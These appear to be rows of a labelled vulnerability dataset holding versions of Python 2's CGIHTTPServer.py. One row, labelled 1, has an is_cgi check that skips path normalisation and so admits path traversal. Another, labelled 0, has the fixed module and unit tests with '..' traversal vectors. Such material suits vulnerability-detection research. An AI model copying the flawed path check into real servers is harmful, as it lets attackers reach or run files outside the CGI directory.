            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
26,da0db632923542536dce5b45f54d19f7d5998b6f,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
27,da0db632923542536dce5b45f54d19f7d5998b6f,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

